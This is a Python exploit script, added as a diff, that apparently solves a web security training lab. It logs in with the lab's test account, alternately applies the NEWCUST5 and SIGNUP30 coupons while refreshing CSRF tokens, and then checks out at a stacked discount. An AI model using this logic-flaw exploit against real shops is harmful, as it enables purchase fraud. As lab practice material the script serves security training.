@@ -1,0 +1,218 @@
+import argparse
+import re
+from colorama import Fore
+import requests
+from urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+URL = None
+
+def main():
+    global URL
+
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-u', "--url", required=True, help="Target URL (e.g., https://vulnerablehost.com)")
+    parser.add_argument("--proxy", help='HTTP Proxy (e.g, http://127.0.0.1:8080)')
+    args = parser.parse_args()
+
+    URL = args.url.rstrip('/')
+    session = requests.Session()
+
+    if args.proxy: 
+        session.proxies = {
+            'http': args.proxy,
+            'https': args.proxy
+        }
+    session.verify = False
+   
+    print(f"{Fore.YELLOW}Getting CSRF...{Fore.RESET}")
+    response = fetch(session, '/login')
+    csrf_token = get_csrf(response.text)
+
+    print(f"{Fore.YELLOW}Logging in as 'wiener'...{Fore.RESET}")
+    data = { 
+        "csrf": csrf_token,
+        "username": "wiener", 
+        "password": "peter" 
+    }
+    login(session, data)
+    print(f"{Fore.GREEN}[+] Logged in!{Fore.RESET}")
+
+    print(f"{Fore.YELLOW}Placing order...{Fore.RESET}")
+    data = {
+        "productId": 1, 
+        "redir": "PRODUCT",
+        "quantity": 1  
+    }
+    place_order(session, "/cart", data)
+    
+    print(f"{Fore.YELLOW}Getting CSRF...{Fore.RESET}")
+    response = fetch(session, '/login')
+    csrf_token2 = get_csrf(response.text)
+
+    print(f"{Fore.YELLOW}Adding NEWCUST5 and SIGNUP30 alternatively...{Fore.RESET}")
+    data = {
+        "csrf": csrf_token2,
+        "coupon": "NEWCUST5"
+    }
+    addcoupon(session, "/cart/coupon", data)
+
+    print(f"{Fore.YELLOW}Getting CSRF...{Fore.RESET}")
+    response = fetch(session, '/login')
+    csrf_token2 = get_csrf(response.text)
+
+    data = {
+        "coupon": "SIGNUP30",
+        "csrf": csrf_token2
+    }
+    addcoupon(session, "/cart/coupon", data)
+
+    print(f"{Fore.YELLOW}Getting CSRF...{Fore.RESET}")
+    response = fetch(session, '/login')
+    csrf_token2 = get_csrf(response.text)
+
+    data = {
+        "coupon": "NEWCUST5",
+        "csrf": csrf_token2
+    }
+    addcoupon(session, "/cart/coupon", data)
+
+    print(f"{Fore.YELLOW}Getting CSRF...{Fore.RESET}")
+    response = fetch(session, '/login')
+    csrf_token2 = get_csrf(response.text)
+
+    data = {
+        "coupon": "SIGNUP30",
+        "csrf": csrf_token2
+    }
+    addcoupon(session, "/cart/coupon", data)
+
+    print(f"{Fore.YELLOW}Getting CSRF...{Fore.RESET}")
+    response = fetch(session, '/login')
+    csrf_token2 = get_csrf(response.text)
+
+    data = {
+        "coupon": "NEWCUST5",
+        "csrf": csrf_token2
+    }
+    addcoupon(session, "/cart/coupon", data)
+
+    print(f"{Fore.YELLOW}Getting CSRF...{Fore.RESET}")
+    response = fetch(session, '/login')
+    csrf_token2 = get_csrf(response.text)
+
+    data = {
+        "coupon": "SIGNUP30",
+        "csrf": csrf_token2
+    }
+    addcoupon(session, "/cart/coupon", data)
+
+    print(f"{Fore.YELLOW}Getting CSRF...{Fore.RESET}")
+    response = fetch(session, '/login')
+    csrf_token2 = get_csrf(response.text)
+
+    data = {
+        "coupon": "NEWCUST5",
+        "csrf": csrf_token2
+    }
+    addcoupon(session, "/cart/coupon", data)
+
+    print(f"{Fore.YELLOW}Getting CSRF...{Fore.RESET}")
+    response = fetch(session, '/login')
+    csrf_token2 = get_csrf(response.text)
+
+    data = {
+        "coupon": "SIGNUP30",
+        "csrf": csrf_token2
+    }
+    addcoupon(session, "/cart/coupon", data)
+
+    print(f"{Fore.YELLOW}Getting CSRF...{Fore.RESET}")
+    response = fetch(session, '/login')
+    csrf_token2 = get_csrf(response.text)
+
+    data = {
+        "coupon": "NEWCUST5",
+        "csrf": csrf_token2
+    }
+    addcoupon(session, "/cart/coupon", data)
+
+    print(f"{Fore.YELLOW}Getting CSRF...{Fore.RESET}")
+    response = fetch(session, '/login')
+    csrf_token2 = get_csrf(response.text)
+
+    data = {
+        "coupon": "SIGNUP30",
+        "csrf": csrf_token2
+    }
+    addcoupon(session, "/cart/coupon", data)
+
+    print(f"{Fore.YELLOW}Checking out...{Fore.RESET}")
+    data = { "csrf": csrf_token2 }
+    checkout(session, "/cart/checkout", data)
+
+    response = fetch(session, '/cart/order-confirmation?order-confirmed=true')
+    if response.status_code == 200:
+        if "Congratulations, you solved the lab!" in response.text:
+            print(f"{Fore.GREEN}[+] Lab was solved!{Fore.RESET}")
+            exit(1)
+    print(f"{Fore.RED}[-] Lab not solved!{Fore.RESET}")
+
+def fetch(session, path):
+    try:
+        return session.get(f"{URL}{path}", allow_redirects=False)
+    except:
+        print(f"{Fore.RED}[!] Failed to fetch {path} through exception{Fore.RESET}")
+        exit(1)
+
+def get_csrf(text):
+    csrf_matches = re.search(r"csrf\" value=\"(.+)\"", text)
+    if not csrf_matches:
+        print(f"{Fore.RED}[-] CSRF Token not found!{Fore.RESET}")
+        exit(1)
+    csrf_token = csrf_matches.groups(1)
+    print(f"{Fore.GREEN}[+] Found CSRF Token: {csrf_token}{Fore.RESET}")
+    return csrf_token
+
+def login(session, data):
+    try:
+        session.post(f"{URL}/login", data, allow_redirects=False)
+    except:
+        print(f"{Fore.RED}[!] Failed to login as {data['username']} through exception{Fore.RESET}")
+        exit(1)
+
+def place_order(session, path, data):
+    try:
+        session.post(
+            f"{URL}{path}", 
+            data=data, 
+            allow_redirects=False
+        )
+    except Exception as e:
+        print(f"{Fore.RED}[!] Failed to place order through exception: {e}{Fore.RESET}")
+        exit(1)
+
+def checkout(session, path, data):
+    try:
+        session.post(
+            f"{URL}{path}", 
+            data=data, 
+            allow_redirects=False
+        )
+    except Exception as e:
+        print(f"{Fore.RED}[!] Failed to place order through exception: {e}{Fore.RESET}")
+        exit(1)
+
+def addcoupon(session, path, data):
+    try:
+        session.post(
+            f"{URL}{path}",
+            data=data,
+            allow_redirects=False
+        )
+    except Exception as e:
+        print(f"{Fore.RED}[!] Failed to add coupon through exception: {e}{Fore.RESET}")
+        exit(1)
+
+if __name__ == "__main__":
+    main()
